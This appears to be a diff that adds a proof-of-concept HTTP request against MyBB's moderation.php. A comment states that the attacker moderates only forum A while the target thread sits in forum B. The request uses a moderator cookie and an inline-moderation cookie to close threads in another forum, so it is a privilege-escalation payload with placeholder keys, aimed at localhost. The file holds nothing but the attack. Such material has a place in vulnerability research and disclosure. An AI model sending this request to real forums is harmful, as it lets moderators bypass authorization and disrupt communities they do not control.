@@ -1,0 +1,7 @@
+# attacker moderates forum A only; target thread lives in forum B
+POST /moderation.php HTTP/1.1
+Host: localhost:25850
+Content-Type: application/x-www-form-urlencoded
+Cookie: mybbuser=<A-mod uid_loginkey>; inlinemod_forum2=15
+
+action=multiclosethreads&fid=2&inlinetype=forum&my_post_key=<key>
